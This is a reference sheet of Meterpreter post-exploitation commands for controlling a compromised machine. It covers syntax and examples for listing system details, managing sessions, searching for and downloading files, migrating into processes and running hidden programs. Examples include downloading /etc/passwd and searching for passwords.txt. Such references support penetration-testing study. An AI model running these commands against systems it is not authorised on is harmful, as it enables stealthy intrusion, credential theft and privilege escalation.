# Common Meterpreter Commands

## `sysinfo`

Displays basic information about the compromised system, including:

- Operating System
- System Architecture
- Computer Name

**Syntax**

```text
sysinfo
```

---

## `getuid`

Displays the user account under which the current Meterpreter session is running.

**Syntax**

```text
getuid
```

---

## `background`

Sends the current Meterpreter session to the background without terminating it.

**Syntax**

```text
background
```

---

## `sessions`

Used to manage Meterpreter sessions.

### List all active sessions

```text
sessions -l
```

### Interact with a specific session

```text
sessions -i SESSION_ID
```

### Terminate a session

```text
sessions -k SESSION_ID
```

### Execute a command on a session

```text
sessions -C "COMMAND" -i SESSION_ID
```

### Assign a custom name to a session

```text
sessions -n NAME -i SESSION_ID
```

---

## `edit`

Opens a file for editing.

**Syntax**

```text
edit FILE
```

**Example**

```text
edit /etc/passwd
```

---

## `download`

Downloads a file from the target machine to the attacker's system.

**Syntax**

```text
download TARGET_FILE [LOCAL_PATH]
```

**Example**

```text
download /etc/passwd
```

---

## `checksum`

Calculates the hash of a file.

**Syntax**

```text
checksum TYPE FILE
```

Supported hash algorithms:

- MD5
- SHA1
- SHA256

**Example**

```text
checksum md5 /bin/bash
```

---

## `getenv`

Displays environment variables.

### Display all variables

```text
getenv
```

### Display a specific variable

```text
getenv PATH
```

---

## `search`

Searches for files on the target system.

### Search by filename

```text
search -f FILE_NAME
```

### Search within a specific directory

```text
search -d DIRECTORY
```

### Search by filename inside a directory

```text
search -d DIRECTORY -f FILE_NAME
```

**Examples**

```text
search -f passwords.txt
```

```text
search -d /home
```

```text
search -d /var -f *.log
```

---

## `ps`

Displays the running processes on the target system.

**Syntax**

```text
ps
```

This command is commonly used before performing:

- Process migration (`migrate`)

---

## `migrate`

Moves the Meterpreter session into another running process.

**Syntax**

```text
migrate PID
```

or

```text
migrate -N PROCESS_NAME
```

**Example**

```text
migrate 1234
```

Common reasons to migrate:

- Improve session stability
- Prevent losing the session if the original process exits
- Migrate into a process with higher privileges

---

## `execute`

Executes a program or command on the target.

**Syntax**

```text
execute -f FILE
```

Run the program hidden:

```text
execute -f FILE -H
```

Run interactively:

```text
execute -f FILE -i
```

**Examples**

```text
execute -f notepad.exe
```

```text
execute -f /bin/bash -i
```

---

## `shell`

Launches a standard system command shell from Meterpreter.

**Syntax**

```text
shell
```

---

## `bash -i`

Starts an interactive Bash shell.

**Syntax**

```text
bash -i
```

Useful for upgrading a basic shell into a more interactive Bash session.

---

## `show_mount`

Displays the mounted storage devices on the target system.

Examples include:

- Local drives (e.g., `C:`, `D:`)
- Mounted disks
- Network shares

**Syntax**

```text
show_mount
```